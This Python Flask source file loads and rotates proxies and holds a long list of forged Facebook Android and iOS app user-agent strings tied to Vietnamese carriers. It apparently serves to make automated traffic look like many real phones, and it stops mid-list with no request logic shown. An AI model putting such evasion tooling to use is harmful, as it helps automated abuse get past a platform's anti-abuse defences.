from flask import Flask, request, jsonify
import requests
import json
import random
import os

app = Flask(__name__)

PROXY_LIST = []

def load_proxies():
    global PROXY_LIST
    proxy_file = 'proxy.txt'
    
    if not os.path.exists(proxy_file):
        print(f"⚠️  Không tìm thấy file {proxy_file}")
        return
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            PROXY_LIST = [line.strip() for line in lines if line.strip()]
        print(f"✅ Đã load {len(PROXY_LIST)} proxy từ {proxy_file}")
    except Exception as e:
        print(f"❌ Lỗi khi đọc file proxy: {str(e)}")

def get_random_proxy():
    if not PROXY_LIST:
        return None
    
    proxy_line = random.choice(PROXY_LIST)
    parts = proxy_line.split(':')
    
    if len(parts) == 4:
        ip, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    elif len(parts) == 2:
        ip, port = parts
        proxy_url = f"http://{ip}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    
    return None


load_proxies()

USER_AGENTS = [
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1803 Build/O11019) [FBAN/FB4A;FBAV/410.0.0.29.107;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/48230491;FBCR/Viettel;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1803;FBSV/8.1.0;FBCA/armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A107F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/401.0.0.27.96;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/456789123;FBCR/MobiFone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A107F;FBSV/10;FBCA/armeabi-v7a;FBDM/{density=1.5,width=720,height=1560};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/410.0.0.29.107;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/123456789;FBCR/VinaPhone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 9;FBSV/11;FBCA/armeabi-v7a;FBDM/{density=2.0,width=1080,height=2340};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; 23113RKC6C Build/PQ3A.190705.08211809) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/480086274;FBCR/MobiFone;FBMF/Redmi;FBBD/Redmi;FBDV/23113RKC6C;FBSV/9;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-G991B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/425.0.0.22.49;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/567891234;FBCR/Viettel;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G991B;FBSV/12;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; RMX2170 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/398.0.0.21.106;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/345678901;FBCR/VinaPhone;FBMF/realme;FBBD/realme;FBDV/RMX2170;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-J530F Build/R16NW) [FBAN/FB4A;FBAV/392.0.0.32.107;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/234567890;FBCR/MobiFone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-J530F;FBSV/8.0.0;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; M2102J20SG Build/RKQ1.200826.002) [FBAN/FB4A;FBAV/420.0.0.37.58;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/678901234;FBCR/Viettel;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2102J20SG;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.625,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1920 Build/PKQ1.190519.001) [FBAN/FB4A;FBAV/405.0.0.23.72;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/789012345;FBCR/VinaPhone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1920;FBSV/9;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; Redmi 8A Build/QKQ1.191014.001) [FBAN/FB4A;FBAV/412.0.0.36.116;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/890123456;FBCR/MobiFone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 8A;FBSV/10;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-A32 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/428.0.0.26.117;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/901234567;FBCR/Viettel;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A32;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1600};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; RMX3560 Build/SP1A.210812.016) [FBAN/FB4A;FBAV/435.0.0.27.108;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/012345678;FBCR/VinaPhone;FBMF/realme;FBBD/realme;FBDV/RMX3560;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2412};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6A Build/O11019) [FBAN/FB4A;FBAV/388.0.0.29.104;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/123450987;FBCR/MobiFone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 6A;FBSV/8.1.0;FBCA/armeabi-v7a;FBDM/{density=1.5,width=720,height=1440};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; VS1910 Build/QKQ1.191222.002) [FBAN/FB4A;FBAV/415.0.0.35.114;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/234561098;FBCR/Viettel;FBMF/Vsmart;FBBD/Vsmart;FBDV/VS1910;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J610F Build/PPR1.180610.011) [FBAN/FB4A;FBAV/400.0.0.30.115;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/345672109;FBCR/VinaPhone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-J610F;FBSV/9;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1480};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; CPH2237 Build/RKQ1.201217.002) [FBAN/FB4A;FBAV/422.0.0.26.69;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/456783210;FBCR/MobiFone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2237;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; M2101K6G Build/SKQ1.210908.001) [FBAN/FB4A;FBAV/440.0.0.33.118;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/567894321;FBCR/Viettel;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2101K6G;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; RMX2001 Build/QKQ1.200216.002) [FBAN/FB4A;FBAV/408.0.0.24.107;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/678905432;FBCR/VinaPhone;FBMF/realme;FBBD/realme;FBDV/RMX2001;FBSV/10;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2340};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; BKK-L21 Build/HUAWEIBKK-L21) [FBAN/FB4A;FBAV/395.0.0.27.109;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/789016543;FBCR/MobiFone;FBMF/Huawei;FBBD/Huawei;FBDV/BKK-L21;FBSV/8.0.0;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-A715F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/430.0.0.23.113;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/890127654;FBCR/Viettel;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A715F;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi 7A Build/PKQ1.190319.001) [FBAN/FB4A;FBAV/403.0.0.26.81;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/901238765;FBCR/VinaPhone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 7A;FBSV/9;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; CPH1931 Build/QKQ1.200216.002) [FBAN/FB4A;FBAV/418.0.0.33.69;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/012349876;FBCR/MobiFone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1931;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1600};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; RMX3085 Build/SP1A.210812.016) [FBAN/FB4A;FBAV/433.0.0.32.110;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/123460987;FBCR/Viettel;FBMF/realme;FBBD/realme;FBDV/RMX3085;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2412};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415F Build/M1AJQ) [FBAN/FB4A;FBAV/390.0.0.23.104;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/234571098;FBCR/VinaPhone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-J415F;FBSV/8.1.0;FBCA/armeabi-v7a;FBDM/{density=1.5,width=720,height=1480};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; M2007J20CG Build/RKQ1.200826.002) [FBAN/FB4A;FBAV/425.0.0.22.49;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/345682109;FBCR/MobiFone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2007J20CG;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1600};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; VS1820 Build/QKQ1.200216.002) [FBAN/FB4A;FBAV/412.0.0.36.116;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/456793210;FBCR/Viettel;FBMF/Vsmart;FBBD/Vsmart;FBDV/VS1820;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; LM-X420 Build/PKQ1.190414.001) [FBAN/FB4A;FBAV/398.0.0.21.106;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/567804321;FBCR/VinaPhone;FBMF/LG;FBBD/LG;FBDV/LM-X420;FBSV/9;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-A536B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/438.0.0.33.120;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/678915432;FBCR/MobiFone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A536B;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; CPH2125 Build/RKQ1.201217.002) [FBAN/FB4A;FBAV/420.0.0.37.58;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/789026543;FBCR/Viettel;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2125;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 8 Build/QKQ1.200216.002) [FBAN/FB4A;FBAV/405.0.0.23.72;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/890137654;FBCR/VinaPhone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 8;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=1080,height=2340};FB_FW/1;FBRV/0;]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19B74 [FBAN/FBIOS;FBAV/388.0.0.32.106;FBBV/334561789;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.1;FBSS/3;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18F72 [FBAN/FBIOS;FBAV/375.0.0.40.111;FBBV/445672890;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A362 [FBAN/FBIOS;FBAV/410.0.0.42.109;FBBV/556783901;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17H35 [FBAN/FBIOS;FBAV/355.0.0.44.317;FBBV/667894012;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.7;FBSS/2;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E241 [FBAN/FBIOS;FBAV/398.0.0.29.104;FBBV/778905123;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/15.4;FBSS/3;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18B92 [FBAN/FBIOS;FBAV/368.0.0.45.112;FBBV/889016234;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B82 [FBAN/FBIOS;FBAV/425.0.0.36.117;FBBV/990127345;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17D50 [FBAN/FBIOS;FBAV/340.0.0.46.109;FBBV/101238456;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G71 [FBAN/FBIOS;FBAV/415.0.0.38.114;FBBV/212349567;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/15.6;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H17 [FBAN/FBIOS;FBAV/382.0.0.41.107;FBBV/323450678;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/14.8;FBSS/3;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBAV/435.0.0.34.118;FBBV/434561789;FBDV/iPhone14,8;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17G68 [FBAN/FBIOS;FBAV/350.0.0.47.320;FBBV/545672890;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C56 [FBAN/FBIOS;FBAV/392.0.0.33.105;FBBV/656783901;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/15.2;FBSS/3;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18D52 [FBAN/FBIOS;FBAV/372.0.0.39.108;FBBV/767894012;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.4;FBSS/3;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 [FBAN/FBIOS;FBAV/440.0.0.35.119;FBBV/878905123;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17E255 [FBAN/FBIOS;FBAV/345.0.0.48.110;FBBV/989016234;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.4;FBSS/2;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19A346 [FBAN/FBIOS;FBAV/385.0.0.31.103;FBBV/100127345;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/15.0;FBSS/2;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18G69 [FBAN/FBIOS;FBAV/378.0.0.42.113;FBBV/211238456;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.7;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E247 [FBAN/FBIOS;FBAV/445.0.0.36.120;FBBV/322349567;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/16.4;FBSS/3;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17F75 [FBAN/FBIOS;FBAV/348.0.0.49.114;FBBV/433450678;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50 [FBAN/FBIOS;FBAV/395.0.0.30.102;FBBV/544561789;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18C66 [FBAN/FBIOS;FBAV/365.0.0.43.109;FBBV/655672890;FBDV/iPhone11,4;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F66 [FBAN/FBIOS;FBAV/450.0.0.37.121;FBBV/766783901;FBDV/iPhone14,6;FBMD/iPhone;FBSN/iOS;FBSV/16.5;FBSS/3;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17B111 [FBAN/FBIOS;FBAV/338.0.0.50.108;FBBV/877894012;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/13.2;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBAV/408.0.0.32.106;FBBV/988905123;FBDV/iPhone12,1;FBSN/iOS;FBSV/15.5;FBSS/3;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18E199 [FBAN/FBIOS;FBAV/375.0.0.40.111;FBBV/099016234;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/14.5;FBSS/3;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 [FBAN/FBIOS;FBAV/455.0.0.38.122;FBBV/110127345;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.6;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17A844 [FBAN/FBIOS;FBAV/335.0.0.51.107;FBBV/221238456;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/13.1;FBSS/2;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18A8395 [FBAN/FBIOS;FBAV/360.0.0.44.316;FBBV/332349567;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/14.1;FBSS/3;FBCR/MobiFone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H12 [FBAN/FBIOS;FBAV/418.0.0.33.69;FBBV/443450678;FBDV/iPhone12,3;FBSN/iOS;FBSV/15.7;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/80;FBRV/0]",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B Build/TP1A.220624.014) [FBAN/FB4A;FBAV/445.0.0.35.120;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/554561789;FBCR/Viettel;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G998B;FBSV/13;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; RMX3310 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/428.0.0.26.117;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/665672890;FBCR/MobiFone;FBMF/realme;FBBD/realme;FBDV/RMX3310;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; CPH2077 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/415.0.0.35.114;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/776783901;FBCR/VinaPhone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2077;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1600};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; M2012K11AG Build/SKQ1.210908.001) [FBAN/FB4A;FBAV/438.0.0.33.120;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/887894012;FBCR/Viettel;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2012K11AG;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A750F Build/PPR1.180610.011) [FBAN/FB4A;FBAV/402.0.0.26.82;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/998905123;FBCR/MobiFone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A750F;FBSV/9;FBCA/arm64-v8a;FBDM/{density=2.25,width=1080,height=2220};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; CPH2113 Build/RKQ1.201217.002) [FBAN/FB4A;FBAV/422.0.0.26.69;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/109016234;FBCR/VinaPhone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2113;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) [FBAN/FB4A;FBAV/385.0.0.31.103;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/220127345;FBCR/Viettel;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/8.1.0;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; RMX1971 Build/QKQ1.190918.001) [FBAN/FB4A;FBAV/410.0.0.29.107;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/331238456;FBCR/MobiFone;FBMF/realme;FBBD/realme;FBDV/RMX1971;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=1080,height=2340};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-F711B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/435.0.0.27.108;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/442349567;FBCR/VinaPhone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-F711B;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2636};FB_FW/1;FBRV/0;]",
